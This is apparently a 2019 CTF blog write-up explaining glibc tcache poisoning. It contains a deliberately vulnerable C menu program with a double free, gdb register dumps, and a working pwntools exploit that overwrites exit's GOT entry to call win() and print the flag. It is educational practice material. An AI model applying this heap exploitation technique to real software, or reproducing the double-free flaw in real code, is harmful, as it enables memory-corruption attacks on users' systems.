---
layout: post
title:  "Tcache Poisoning [heap exploitation]"
date:   2019-09-09 03:59:00
categories: research
tags: heap linux libc ctf pwn
description: this article explains about heap.
---


# Tcache Poisoning
what is tcache poisoning ?
In glibc-2.26, TCache (per-thread cache), a new feature, was introduced in malloc.
and tcache poisoning is a technique to poison Tcache feature in glibc-2.26. for example from how2heap by shellpish team

	This file demonstrates a simple tcache poisoning attack by tricking malloc into
	returning a pointer to an arbitrary location (in this case, the stack).
	The attack is very similar to fastbin corruption attack.

	The address we want malloc() to return is 0x7ffedaf11040.
	Allocating 1 buffer.
	malloc(128): 0x55a2b964b260
	Freeing the buffer...
	Now the tcache list has [ 0x55a2b964b260 ].
	We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55a2b964b260
	to point to the location to control (0x7ffedaf11040).
	1st malloc(128): 0x55a2b964b260
	Now the tcache list has [ 0x7ffedaf11040 ].
	2nd malloc(128): 0x7ffedaf11040
	We got the control

for another example we will try to exploit this simple program, by using tcache poisoning:

{% highlight c %}
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#define SZ_BLOCK 200
#define SZ_HEAP  10
#define SZ_FLAG 100

char a[100];
u_int *(buf);

void win(){
	char buf[SZ_FLAG];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL){
		puts("[!] error code 901");
		exit(0);
	}
	fgets(buf,SZ_FLAG,f);
	puts(buf);
}

void welcome(){
puts("     __                      __                           _                      _              ");
puts("    / /_ _____ ____ _ _____ / /_   ___     ____   ____   (_)_____ ____   ____   (_)____   ____ _");
puts("   / __// ___// __ `// ___// __ \\ / _ \\   / __ \\ / __ \\ / // ___// __ \\ / __ \\ / // __ \\ / __ `/");
puts("  / /_ / /__ / /_/ // /__ / / / //  __/  / /_/ // /_/ // /(__  )/ /_/ // / / // // / / // /_/ / ");
puts("  \\__/ \\___/ \\__,_/ \\___//_/ /_/ \\___/  / .___/ \\____//_//____/ \\____//_/ /_//_//_/ /_/ \\__, /  ");
puts("       HackerClass Gunadarma @2019     /_/        author: arsalan (tripoloski)         /____/   ");
}

void menu(){
	puts("+---------------------+");
	puts("|         Menu        |");
	puts("+---------------------+");
	puts("| 1. allocate memory  |");
	puts("| 2. freeing memory   |");
	puts("| 3. exit             |");
	puts("+---------------------+");
	printf("| select [1-3] : ");
}

void init(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
}

void create_memory(){
	int size;
	printf("[?] size : ");
	//read(0,size , sizeof(size));
	scanf("%d" , &size);
	printf("[?] data : ");
	if (size <= 0x88){
		buf = malloc(size);
		read(0,buf , size);
	}
	puts("[+] memory allocated!");
}

void release_memory(){
	free(buf);
}

void main(){
	init();
	char buf[4];
	welcome();
	while(1){
		menu();
		read(0 , buf , sizeof(buf));
		switch(atoi(buf)){
			case 1:
				create_memory();
				break;
			case 2:
				release_memory();
				break;
			case 3:
				puts("[+] exiting...");
				exit(0);
				break;
			default:
				puts("[!] invalid choice error code 1902");
				break;
		}
	}
}
{% endhighlight %}


you can find this challenge on my repository [here](https://github.com/tripoloski1337/learn-to-pwn/tree/master/tcache_poisoning) in this case we have to allocating memory and double freeing , since there's no checks for double free on glibc-2.26+. so we can directly do double free, after that we can allocate memory and fill it with whatever we want. at this point we already controll the rdx register.

	malloc(0x100)
	free(0)
	free(0)
	malloc(0x100) <------ control rdi
	malloc(0x100) <------ just a padding
	malloc(0x100) <------ another control

### how can it be ?
if you look into gdb there's something interesting at address **<malloc+407>**

     → 0x7ffff7a7b207 <malloc+407>     mov    rdi, QWORD PTR [rdx]

this instruction will mov rdx value to rdi. it's mean it will move whatever value is from rdx to rdi register. and suddenly our rdx is filled with our input before

    $rax   : 0x5
    $rbx   : 0x64
    $rcx   : 0x0000000000602010  →  0x0000000000000000
    $rdx   : 0x4141414141414141 ("AAAAAAAA"?) <----- our input data from the seccond malloc
    $rsp   : 0x00007fffffffe320  →  0x0000000000400dd1  →  "+---------------------+"
    $rbp   : 0xffffffffffffffb0
    $rsi   : 0x0000000000602038  →  0x0000000000000000
    $rdi   : 0x64
    $rip   : 0x00007ffff7a7b207  →  <malloc+407> mov rdi, QWORD PTR [rdx]
    $r8    : 0xb
    $r9    : 0x0
    $r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
    $r11   : 0x246
    $r12   : 0x0000000000400740  →  <_start+0> xor ebp, ebp
    $r13   : 0x00007fffffffe460  →  0x0000000000000001
    $r14   : 0x0
    $r15   : 0x0

in this case we can GOT overwrite from exit() function to win() function

{% highlight c %}
	case 3:
		puts("[+] exiting...");
		exit(0); <-- our goal to change it to win()
		break;
{% endhighlight %}

to make it more clear and reliable i made a python script to exploit this binary

{%highlight python%}

from pwn import *
r = process("./tcache_poisoning")

def alloc(size,data ):
	r.sendlineafter("| select [1-3] :","1")
	r.sendlineafter("[?] size :",str(size))
	r.sendlineafter("[?] data :",data)
	log.info("allocating")

def free():
	r.sendlineafter("| select [1-3] :","2")
	log.info("freeing")

win_plt = 0x0000000000400827
exit_got = 0x000000601348
#gdb.attach(r)
alloc(0x28,"A"*8)

free()
free()

alloc(0x28,p64(exit_got))
alloc(0x28,p8(0x00))
alloc(0x28,p64(win_plt))

r.interactive()

{% endhighlight %}

after running this python script we can select option 3 to trigger exit(). and exit() is not the real exit() function anymore it was win() function, because we GOT overwrite it

	[+] Starting local process './tcache_poisoning': pid 28800
	[*] allocating
	[*] allocating
	[*] freeing
	[*] freeing
	[*] allocating
	[*] allocating
	[*] allocating
	[*] Switching to interactive mode
	 [+] memory allocated!
	+---------------------+
	|         Menu        |
	+---------------------+
	| 1. allocate memory  |
	| 2. freeing memory   |
	| 3. exit             |
	+---------------------+
	| select [1-3] : $ 3
	[+] exiting...
	ctf{y0u_must_b3_a_pwnerrrr!!!!!}

as you can see there's string ***ctf{y0u_must_b3_a_pwnerrrr!!!!!}***. it mean our win() function has been called and give us data from file flag.txt, you can see what win() actually do here
{% highlight c %}
void win(){
	char buf[SZ_FLAG];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL){
		puts("[!] error code 901");
		exit(0);
	}
	fgets(buf,SZ_FLAG,f);
	puts(buf);
}
{% endhighlight %}
